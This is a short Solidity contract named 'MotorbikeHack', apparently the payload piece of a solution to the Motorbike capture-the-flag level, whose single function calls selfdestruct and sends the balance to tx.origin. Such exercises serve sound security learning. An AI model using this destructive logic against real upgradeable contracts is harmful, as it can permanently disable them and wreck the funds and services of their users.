pragma solidity ^0.8.10;

contract MotorbikeHack {
    function boom() external {
        selfdestruct(payable(tx.origin));
    }
}
